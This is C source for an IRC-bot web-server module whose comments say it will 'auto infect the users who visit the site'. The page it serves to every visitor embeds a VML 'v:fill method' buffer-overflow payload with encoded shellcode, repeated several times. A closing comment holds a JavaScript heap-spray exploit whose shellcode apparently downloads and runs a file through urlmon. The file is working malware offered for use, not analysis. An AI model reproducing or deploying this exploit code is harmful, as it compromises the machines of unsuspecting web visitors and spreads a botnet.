#include "include.h"
#include "extern.h"

#pragma warning(disable : 4129)

/*Vml mod by rex
* !httpdstart <port>
* !imspread http://Bot'sip:port
* Will auto infect the users who visit the site.
* Things to be done*IMSPREAD IN BOT*
* beta 1 none
*/ 
//go to bottem of script


char *http_filetohtml(char *file)
/* replace '\\' with '/' */
{
	unsigned int c;
	for(c = 0; c < strlen(file); c++)
	{
		if(file[c] == '\\') 
			file[c] = '/';
	}
	return file;
}

void http_checkfile(struct httpds httpd, char *rFile)
/* check if file can be sent */
{
	unsigned long c;
	unsigned long d;
	char file[256];
	char nFile[256];
	char tFile[256];
	bool directory = false;
	memset(nFile, 0, sizeof(nFile));
	if(rFile[0] != '/') 
		_snprintf(file, sizeof(file) - 1, "\\%s", rFile);
	else
	{
		rFile[0] = '\\';
		strncpy(file, rFile, sizeof(file) - 1);
	}
	for(c = 0, d = 0; c < strlen(file); c++, d++)
	{
		if((((c + 2 < strlen(file) && file[c] == '%' && file[c+1] == '2' && file[c+2] == '0'))))
		{
			nFile[d] = ' ';
			c += 2;
		}
		else
			nFile[d] = (file[c] == '/') ? '\\': file[c];
	}
	_snprintf(tFile, sizeof(tFile) - 1, "%s%s", httpd.dir, nFile);
	strtok(tFile, "\n");
	switch(GetFileAttributes(tFile))
	{
		case FILE_ATTRIBUTE_DIRECTORY:
			directory = true;
			break;
		case 0xFFFFFFFF:
			closesocket(httpd.sock);
			return;
		default:
			break;
	}
	if(nFile[d-1] == '\\') 
		directory = true;
	if(directory)
	{
		strncat(tFile, "*", sizeof(tFile) - 1);
		strncpy(httpd.file, tFile, sizeof(tFile) - 1);
		http_filetohtml(nFile);
		strncpy(httpd.path, nFile, sizeof(httpd.path) - 1);
		httpd.type = true;
		httpd.length = -1;
	}
	else
	{
		HANDLE testfile = CreateFile(tFile, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
      	if(testfile != INVALID_HANDLE_VALUE)
		{
			strncpy(httpd.file, tFile, sizeof(httpd.file) - 1);
			httpd.type = false;
			httpd.length = GetFileSize(testfile, 0);
			CloseHandle(testfile);
		}
	}
	httpd.gotinfo = false;
	if(!CreateThread(0, 131072, http_header, &httpd, 0, 0))
		return;
	while(!httpd.gotinfo)
		Sleep(10);
}



void http_getfiles(SOCKET sock, char *current, const char *url)
/* send list of files in the directory */
{
	int count = 0;
	int count2 = 0;
	unsigned int COL1 = 230;
	unsigned int COL2 = 150;
	unsigned int COL3 = 60;
	unsigned int FILESIZE = 30;
	char parent[256];
	char tmpDate[40];
	char tmpDir[256];
	char buf[512];
	HANDLE Hnd;
	FILETIME ftBuf;
	SYSTEMTIME stBuf;
	WIN32_FIND_DATA WFD;
	memset(parent, 0, sizeof(parent));
	strtok(current, "\n");
	if(url)
	{
		current[(strlen(current)-1)] = 0;
		_snprintf(buf, sizeof(buf), "<head>\r\n", current);
		send(sock, buf, strlen(buf), 0);
		current[(strlen(current))] = '*';
		_snprintf(buf, sizeof(buf), "<title>Site Offline.</title>\r\n", COL1, COL2, COL3);
		send(sock, buf, strlen(buf), 0);
		_snprintf(buf, sizeof(buf), "<style>\r\n");
		send(sock, buf, strlen(buf), 0);
		_snprintf(buf, sizeof(buf), "v\:* { behavior: url(#default#VML); }\r\n");
		send(sock, buf, strlen(buf), 0);
		_snprintf(buf, sizeof(buf), "</style>\r\n");
		send(sock, buf, strlen(buf), 0);
		_snprintf(buf, sizeof(buf), "</head>\r\n");
		send(sock, buf, strlen(buf), 0);
    	_snprintf(buf, sizeof(buf), "<body>\r\n");
		send(sock, buf, strlen(buf), 0);
		_snprintf(buf, sizeof(buf), "<v:fill method=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#52445;&#30720;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#56459;&#28606;&#28527;&#20080;&#28607;&#12336;&#20336;&#14659;&#30011;&#19451;&#13184;&#14830;&#64627;&#63349;&#54271;&#28526;&#28783;&#19207;&#61166;&#45550;&#20362;&#61150;&#61166;&#44645;&#26082;&#62110;&#25923;&#59014;&#6501;&#60036;&#1719;&#61099;&#61166;&#5900;&#33158;&#61056;&#34542;&#40091;&#33666;&#4538;&#31736;&#56838;&#61166;&#28142;&#52738;&#12901;&#52868;&#4541;&#60088;&#59945;&#45805;&#49295;&#10635;&#60842;&#38634;&#61067;&#56814;&#48686;&#48574;&#48825;&#47121;&#26110;&#48690;&#4541;&#59064;&#61316;&#47121;&#49122;&#26040;&#53915;&#39525;&#38592;&#7149;&#26040;&#52888;&#7149;&#10205;&#44967;&#60739;&#56619;&#57653;&#65104;&#14548;&#59034;&#9519;&#60899;&#44596;&#7941;&#61909;&#2459;&#26032;&#51888;&#13293;&#25992;&#42466;&#45157;&#60914;&#25907;&#26090;&#11245;&#45125;&#11703;&#47110;&#4369;&#24593;&#57504;&#12034;&#2967;&#30294;&#25616;&#37088;&#3126;&#55453;&#49652;&#13214;&#60962;&#32406;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#25982;&#28210;&#12336;&#36976;/>\r\n");
		send(sock, buf, strlen(buf), 0);
		_snprintf(buf, sizeof(buf), "</v:rect>\r\n");
		send(sock, buf, strlen(buf), 0);
		_snprintf(buf, sizeof(buf), "</body>\r\n");
		send(sock, buf, strlen(buf), 0);
		_snprintf(buf, sizeof(buf), "</html>\r\n");
		send(sock, buf, strlen(buf), 0);
	}
	else
	{
		_snprintf(buf, sizeof(buf), "<v:fill method=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#52445;&#30720;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#56459;&#28606;&#28527;&#20080;&#28607;&#12336;&#20336;&#14659;&#30011;&#19451;&#13184;&#14830;&#64627;&#63349;&#54271;&#28526;&#28783;&#19207;&#61166;&#45550;&#20362;&#61150;&#61166;&#44645;&#26082;&#62110;&#25923;&#59014;&#6501;&#60036;&#1719;&#61099;&#61166;&#5900;&#33158;&#61056;&#34542;&#40091;&#33666;&#4538;&#31736;&#56838;&#61166;&#28142;&#52738;&#12901;&#52868;&#4541;&#60088;&#59945;&#45805;&#49295;&#10635;&#60842;&#38634;&#61067;&#56814;&#48686;&#48574;&#48825;&#47121;&#26110;&#48690;&#4541;&#59064;&#61316;&#47121;&#49122;&#26040;&#53915;&#39525;&#38592;&#7149;&#26040;&#52888;&#7149;&#10205;&#44967;&#60739;&#56619;&#57653;&#65104;&#14548;&#59034;&#9519;&#60899;&#44596;&#7941;&#61909;&#2459;&#26032;&#51888;&#13293;&#25992;&#42466;&#45157;&#60914;&#25907;&#26090;&#11245;&#45125;&#11703;&#47110;&#4369;&#24593;&#57504;&#12034;&#2967;&#30294;&#25616;&#37088;&#3126;&#55453;&#49652;&#13214;&#60962;&#32406;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#25982;&#28210;&#12336;&#36976;/>\r\n");
		send(sock, buf, strlen(buf), 0);
	}
	if(url && strlen(url) > 2)
	{
		unsigned int c;
		for(c = strlen(url) - 3; c != 0; c--)
		{
			if(url[c] == '/') 
				break;
		}
		strncpy(parent, url, c + 1);
		_snprintf(buf, sizeof(buf), "<v:fill method=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#52445;&#30720;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#56459;&#28606;&#28527;&#20080;&#28607;&#12336;&#20336;&#14659;&#30011;&#19451;&#13184;&#14830;&#64627;&#63349;&#54271;&#28526;&#28783;&#19207;&#61166;&#45550;&#20362;&#61150;&#61166;&#44645;&#26082;&#62110;&#25923;&#59014;&#6501;&#60036;&#1719;&#61099;&#61166;&#5900;&#33158;&#61056;&#34542;&#40091;&#33666;&#4538;&#31736;&#56838;&#61166;&#28142;&#52738;&#12901;&#52868;&#4541;&#60088;&#59945;&#45805;&#49295;&#10635;&#60842;&#38634;&#61067;&#56814;&#48686;&#48574;&#48825;&#47121;&#26110;&#48690;&#4541;&#59064;&#61316;&#47121;&#49122;&#26040;&#53915;&#39525;&#38592;&#7149;&#26040;&#52888;&#7149;&#10205;&#44967;&#60739;&#56619;&#57653;&#65104;&#14548;&#59034;&#9519;&#60899;&#44596;&#7941;&#61909;&#2459;&#26032;&#51888;&#13293;&#25992;&#42466;&#45157;&#60914;&#25907;&#26090;&#11245;&#45125;&#11703;&#47110;&#4369;&#24593;&#57504;&#12034;&#2967;&#30294;&#25616;&#37088;&#3126;&#55453;&#49652;&#13214;&#60962;&#32406;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#25982;&#28210;&#12336;&#36976;/>\r\n");
		send(sock, buf, strlen(buf), 0);
	}
	Hnd = FindFirstFile(current, &WFD);
	while(FindNextFile(Hnd, &WFD))
	{
		if(WFD.dwFileAttributes && strcmp(WFD.cFileName, "..") && strcmp(WFD.cFileName, "."))
		{
			FileTimeToLocalFileTime(&WFD.ftLastWriteTime, &ftBuf);
			FileTimeToSystemTime(&ftBuf, &stBuf);
			_snprintf(tmpDate, sizeof(tmpDate), "%2.2d/%2.2d/%4d  %2.2d:%2.2d %s",
				stBuf.wMonth, stBuf.wDay, stBuf.wYear, HOUR(stBuf.wHour), stBuf.wMinute, AMPM(stBuf.wHour));
			if(WFD.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				count2++;
				if(url)
				{
		_snprintf(buf, sizeof(buf), "<v:fill method=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#52445;&#30720;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#56459;&#28606;&#28527;&#20080;&#28607;&#12336;&#20336;&#14659;&#30011;&#19451;&#13184;&#14830;&#64627;&#63349;&#54271;&#28526;&#28783;&#19207;&#61166;&#45550;&#20362;&#61150;&#61166;&#44645;&#26082;&#62110;&#25923;&#59014;&#6501;&#60036;&#1719;&#61099;&#61166;&#5900;&#33158;&#61056;&#34542;&#40091;&#33666;&#4538;&#31736;&#56838;&#61166;&#28142;&#52738;&#12901;&#52868;&#4541;&#60088;&#59945;&#45805;&#49295;&#10635;&#60842;&#38634;&#61067;&#56814;&#48686;&#48574;&#48825;&#47121;&#26110;&#48690;&#4541;&#59064;&#61316;&#47121;&#49122;&#26040;&#53915;&#39525;&#38592;&#7149;&#26040;&#52888;&#7149;&#10205;&#44967;&#60739;&#56619;&#57653;&#65104;&#14548;&#59034;&#9519;&#60899;&#44596;&#7941;&#61909;&#2459;&#26032;&#51888;&#13293;&#25992;&#42466;&#45157;&#60914;&#25907;&#26090;&#11245;&#45125;&#11703;&#47110;&#4369;&#24593;&#57504;&#12034;&#2967;&#30294;&#25616;&#37088;&#3126;&#55453;&#49652;&#13214;&#60962;&#32406;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#25982;&#28210;&#12336;&#36976;/>\r\n");
		send(sock, buf, strlen(buf), 0);
					_snprintf(buf, sizeof(buf), "%s%s/", url, WFD.cFileName);
 					send(sock, buf, strlen(buf), 0);
					if(strlen(WFD.cFileName) > FILESIZE)
						_snprintf(buf, sizeof(buf), "\"><CODE>%.29s&gt;/</CODE></A>", WFD.cFileName);
					else
						_snprintf(buf, sizeof(buf), "\"><CODE>%s/</CODE></A>", WFD.cFileName);
					send(sock, buf, strlen(buf), 0);
					_snprintf(buf, sizeof(buf), "</TD>\r\n<TD WIDTH=\"%d\"><CODE>%s</CODE></TD>\r\n<TD WIDTH=\"%d\" ALIGN=\"right\"><CODE>-</CODE></TD>\r\n</TR>\r\n",
						COL2, tmpDate, COL3);
					send(sock, buf, strlen(buf), 0);
				}
				else
				{
					_snprintf(tmpDir, sizeof(tmpDir), "<%s>", WFD.cFileName);
					_snprintf(buf, sizeof(buf), "%-31s  %-21s\r\n", tmpDir, tmpDate);
					send(sock, buf, strlen(buf), 0);
				}
			}
			else
			{
				count++;
				if(url)
				{
					_snprintf(buf, sizeof(buf), "<TR>\r\n<TD WIDTH=\"%d\"><A HREF=\"", COL1);
 					send(sock, buf, strlen(buf), 0);
					_snprintf(buf, sizeof(buf), "%s%s", url, WFD.cFileName);
 					send(sock, buf, strlen(buf), 0);
					if(strlen(WFD.cFileName) > FILESIZE + 1)
						_snprintf(buf, sizeof(buf), "\"><CODE>%.30s&gt;</CODE></A>", WFD.cFileName);
					else
						_snprintf(buf, sizeof(buf), "\"><CODE>%s</CODE></A>", WFD.cFileName);
 					send(sock, buf, strlen(buf), 0);
					_snprintf(buf, sizeof(buf), "</TD>\r\n<TD WIDTH=\"%d\"><CODE>%s</CODE></TD>\r\n<TD WIDTH=\"%d\" ALIGN=\"right\"><CODE>%dk</CODE></TD>\r\n</TR>\r\n",
						COL2, tmpDate, COL3, WFD.nFileSizeLow / 1024);
					send(sock, buf, strlen(buf), 0);
				}
				else
				{
					_snprintf(buf, sizeof(buf), "%-31s  %-21s (%i bytes)\r\n", WFD.cFileName,tmpDate, WFD.nFileSizeLow);
					send(sock, buf, strlen(buf), 0);
				}
			}
		}
	}
	FindClose(Hnd);
	if(url)
		_snprintf(buf, sizeof(buf), "<TR>\r\n<TD COLSPAN=\"3\"><HR></TD>\r\n</TR>\r\n</TABLE>\r\n</BODY>\r\n</HTML>\r\n");
	else 
		_snprintf(buf, sizeof(buf), "<v:fill method=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#52445;&#30720;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#37008;&#56459;&#28606;&#28527;&#20080;&#28607;&#12336;&#20336;&#14659;&#30011;&#19451;&#13184;&#14830;&#64627;&#63349;&#54271;&#28526;&#28783;&#19207;&#61166;&#45550;&#20362;&#61150;&#61166;&#44645;&#26082;&#62110;&#25923;&#59014;&#6501;&#60036;&#1719;&#61099;&#61166;&#5900;&#33158;&#61056;&#34542;&#40091;&#33666;&#4538;&#31736;&#56838;&#61166;&#28142;&#52738;&#12901;&#52868;&#4541;&#60088;&#59945;&#45805;&#49295;&#10635;&#60842;&#38634;&#61067;&#56814;&#48686;&#48574;&#48825;&#47121;&#26110;&#48690;&#4541;&#59064;&#61316;&#47121;&#49122;&#26040;&#53915;&#39525;&#38592;&#7149;&#26040;&#52888;&#7149;&#10205;&#44967;&#60739;&#56619;&#57653;&#65104;&#14548;&#59034;&#9519;&#60899;&#44596;&#7941;&#61909;&#2459;&#26032;&#51888;&#13293;&#25992;&#42466;&#45157;&#60914;&#25907;&#26090;&#11245;&#45125;&#11703;&#47110;&#4369;&#24593;&#57504;&#12034;&#2967;&#30294;&#25616;&#37088;&#3126;&#55453;&#49652;&#13214;&#60962;&#32406;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#32382;&#25982;&#28210;&#12336;&#36976;/>\r\n");
		send(sock, buf, strlen(buf), 0);
}

void http_sendfile(struct httpds httpd, const char *file)
/* send file to remote host */
{
	unsigned int Fsize;
	unsigned int fsend = 1024;
	unsigned int move;
	unsigned long mode = 0;
	char buffer[1024];
	HANDLE testfile = CreateFile(file, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
	if(testfile == INVALID_HANDLE_VALUE) 
		return;
	Fsize = GetFileSize(testfile, 0);
	while(Fsize)
	{
		int bytes_sent;
		memset(buffer, 0, sizeof(buffer));
		if(fsend > Fsize) 
			fsend = Fsize;
		move = 0 - Fsize;
		SetFilePointer(testfile, move, 0, FILE_END);
		ReadFile(testfile, buffer, fsend, &mode, 0);
		bytes_sent = send(httpd.sock, buffer, fsend, 0);
		if(bytes_sent == -1)
		{
			if(WSAGetLastError() != WSAEWOULDBLOCK) 
				break;
			else 
				bytes_sent = 0;
		}
		Fsize -= bytes_sent;
	}
	if(testfile != INVALID_HANDLE_VALUE) 
		CloseHandle(testfile);
}

DWORD WINAPI http_start(void *param)
/* main httpd function */
{
	int gsin_len;
    unsigned int i;
	unsigned int r;
	unsigned int b;
	unsigned int max;
	unsigned long mode = 1;
	char buffer[4096];
	char rBuffer[4096];
	char file[256];
	char *file_to_send = "";
	struct sockaddr_in gsin;
	struct sockaddr_in ssin;
	struct httpds httpd = *(struct httpds *)param;
	struct httpds *phttpd = (struct httpds *)param;
	SOCKET gsock;
	SOCKET ssock;
	phttpd->gotinfo = true;
	ssin.sin_family = AF_INET;
	ssin.sin_port = htons((unsigned short)httpd.port);
	ssin.sin_addr.s_addr = INADDR_ANY;
	memset(ssin.sin_zero, 0, 8);
	if((ssock = socket(AF_INET, SOCK_STREAM, 0)) != -1)
	{
		if(bind(ssock, (struct sockaddr *)&ssin, sizeof(ssin)) != -1)
		{
			if(listen(ssock, SOMAXCONN) != -1)
			{
				if(ioctlsocket(ssock, FIONBIO, &mode) != -1)
				{
					fd_set master;
					fd_set temp; 
					FD_ZERO(&master); 
					FD_ZERO(&temp);
					FD_SET(ssock, &master);
					max = ssock;
					while(1)
					{
						temp = master;
						if(select(max + 1, &temp, 0, 0, 0) == -1)
							break;
						for(i = 0; i <= max; i++)
						{
							if(FD_ISSET(i, &temp))
							{
								if(i == ssock)
								{
									gsin_len = sizeof(gsin);
									if((gsock = accept(ssock, (struct sockaddr *)&gsin, &gsin_len)) == -1)
										continue; 
									else
									{
										FD_SET(gsock, &master);
										if(gsock > (unsigned int)max)  
											max = gsock;
									}
								}
								else
								{
    								memset(buffer, 0, sizeof(buffer));
									memset(rBuffer, 0, sizeof(rBuffer));
									if(recv(i, buffer, sizeof(buffer), 0) <= 0)
									{
										closesocket(i); 
										FD_CLR(i, &master);
									}
									else
									{
										memset(file, 0, sizeof(file));
										for(b = 0, r = 0; b < strlen(buffer); b++, r++)
										{
											rBuffer[r] = buffer[b];
											if(buffer[b] == '\n')
											{
												if(strstr(rBuffer, "GET ") != 0 && strlen(rBuffer) > 5)
												{
													file_to_send = strtok(strstr(strstr(rBuffer, "GET "), " "), " ");
													strncpy(file, file_to_send, sizeof(file) - 1);
												}
												else if(!strcmp(rBuffer, "\r\n"))
												{
													FD_CLR(i, &master);
													if(file)
													{
														if(strlen(file) + strlen(httpd.dir) < 256)
														{ 
															unsigned long mode2 = 0;
															ioctlsocket(i, FIONBIO, &mode2);
															httpd.sock = i;
															http_checkfile(httpd, file);
														}
														else 
															closesocket(i);
													}
													else 
														closesocket(i);
													break;
												}
												memset(rBuffer, 0, sizeof(rBuffer));
												r = -1;
											}
										}
									}
								}
							}
                		} 
        			}
				}
			}
		}
	}
	closesocket(ssock);
	clearthread(httpd.tnum);
	ExitThread(0);
return 0;
}

DWORD WINAPI http_header(void *param)
/* send http header */
{
	struct httpds httpd = *(struct httpds *)param;
	struct httpds *phttpd = (struct httpds *)param;
	char tFile[256];
	char nFile[256];
	char content[50];
	char buffer[4096];
	char date[70];
	char time[30];
	phttpd->gotinfo = true;
	strncpy(tFile, httpd.file, sizeof(httpd.file) - 1);
	strncpy(nFile, httpd.path, sizeof(httpd.path) - 1);
	if(httpd.type) 
		strncpy(content, "text/html", sizeof(content) - 1);
	else 
		strncpy(content,"application/octet-stream", sizeof(content) - 1);
	GetDateFormat(0x409, 0, 0, "ddd, dd MMM yyyy", date, 70);
	GetTimeFormat(0x409, 0, 0, "HH:mm:ss", time, 30);
	if(httpd.length == -1)
		_snprintf(buffer, sizeof(buffer) - 1, "HTTP/1.0 200 OK\r\nServer: HTTPd\r\nCache-Control: no-cache,no-store,max-age=0\r\npragma: no-cache\r\nContent-Type: %s\r\nAccept-Ranges: bytes\r\nDate: %s %s GMT\r\nLast-Modified: %s %s GMT\r\nExpires: %s %s GMT\r\nConnection: close\r\n\r\n",
		content, date, time, date, time, date, time);
	else
		_snprintf(buffer, sizeof(buffer) - 1, "HTTP/1.0 200 OK\r\nServer: HTTPd\r\nCache-Control: no-cache,no-store,max-age=0\r\npragma: no-cache\r\nContent-Type: %s\r\nContent-Length: %i\r\nAccept-Ranges: bytes\r\nDate: %s %s GMT\r\nLast-Modified: %s %s GMT\r\nExpires: %s %s GMT\r\nConnection: close\r\n\r\n",
		content, httpd.length, date, time, date, time, date, time);
	send(httpd.sock, buffer, strlen(buffer), 0);
	if(!httpd.type) 
		http_sendfile(httpd, tFile);
	else
		http_getfiles(httpd.sock, tFile, nFile);
	closesocket(httpd.sock);
	clearthread(httpd.tnum);
	ExitThread(0);
return 0;
}

/*/*
<html xmlns:v="urn:schemas-microsoft-com:vml">
<head>
<object id="VMLRender" classid="CLSID:10072CEC-8CC1-11D1-986E-00A0C955B42E">
</object>
<style>
v\:* { 
behavior: url(#VMLRender); 
}
</style>
</head>
<body>
<SCRIPT language="javascript">
var heapSprayToAddress = 0x05050505;var payLoadCode = unescape("%u9090%u9090%u9090%uCCE9%u0000%u5F00%u56E8%u0000%u8900%u50C3%u8E68%u0E4E%uE8EC%u0060%u0000%uC931%uB966%u6E6F%u6851%u7275%u6D6C%uFF54%u50D0%u3668%u2F1A%uE870%u0046%u0000%uC931%u5151%u378D%u8D56%u0877%u5156%uD0FF%u6853%uFE98%u0E8A%u2DE8%u0000%u5100%uFF57%u31D0%u49C9%u9090%u6853%uD87E%u73E2%u19E8%u0000%uFF00%u55D0%u6456%u30A1%u0000%u8B00%u0C40%u708B%uAD1C%u688B%u8908%u5EE8%uC35D%u5553%u5756%u6C8B%u1824%u458B%u8B3C%u0554%u0178%u8BEA%u184A%u5A8B%u0120%uE3EB%u4935%u348B%u018B%u31EE%uFCFF%uC031%u38AC%u74E0%uC107%u0DCF%uC701%uF2EB%u7C3B%u1424%uE175%u5A8B%u0124%u66EB%u0C8B%u8B4B%u1C5A%uEB01%u048B%u018B%uE9E8%u0002%u0000%uC031%uEA89%u5E5F%u5B5D%uE8C3%uFF2F%uFFFF%u686D%u2E68%u7865%u0065\r\n);
var heapBlockSize = 0x400000;
var payLoadSize = payLoadCode.length * 2;
var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
var spraySlide = unescape("%u9090%u9090");
spraySlide = getSpraySlide(spraySlide,spraySlideSize);
heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;
memory = new Array();
for (i=0;i<heapBlocks;i++)
{
memory[i] = spraySlide + payLoadCode;
}
function getSpraySlide(spraySlide, spraySlideSize)
{
while (spraySlide.length*2<spraySlideSize)
{
spraySlide += spraySlide;
}
spraySlide = spraySlide.substring(0,spraySlideSize/2);
return spraySlide;
}
</script>
<v:rect style='width:120pt;height:80pt' fillcolor="red"><v:fill method  = "&#x0505;\r\n%u0000\r\n");
*/

